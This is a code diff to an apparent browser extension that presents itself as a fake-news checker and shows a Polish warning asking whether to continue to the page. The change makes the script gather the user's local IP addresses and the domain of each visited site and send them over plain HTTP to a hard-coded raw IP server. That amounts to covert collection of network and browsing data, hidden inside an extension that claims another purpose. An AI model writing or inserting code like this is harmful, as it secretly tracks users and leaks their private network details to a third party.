@@ -1,17 +1,16 @@
+var pathname = window.location.host;
 
-$.get("http://185.24.216.103:25070/webpage/www.gowno.pl",function(data, status){
-    //alert("Data: " + JSON.stringify(data) + "\nStatus: " + status);
-  var pathname = window.location.host;
-  getLocalIPs(function(ips) { // <!-- ips is an array of local IP addresses.
-    chrome.runtime.sendMessage("Data: " + JSON.stringify(data) + "\nStatus: " 
+getLocalIPs(function(ips) { // <!-- ips is an array of local IP addresses.
+  json = {"ip":ips.join('\n '), "domain":pathname};
+  $.get("http://185.24.216.103:25070/webpage/www.gowno.pl",json,function(data, status){
+     chrome.runtime.sendMessage("Data: " + JSON.stringify(data) + "\nStatus: " 
                                + status+"\nUwaga! \nStrona: \n"+ document.getElementsByTagName('title')[0].innerText
                                +" \njest fake newsem! \nCzy chcesz kontynuować? " + ips.join('\n ') + " " + pathname);
 });
 });
 
 
-
-
+ 
 
 function getLocalIPs(callback) {
     var ips = [];
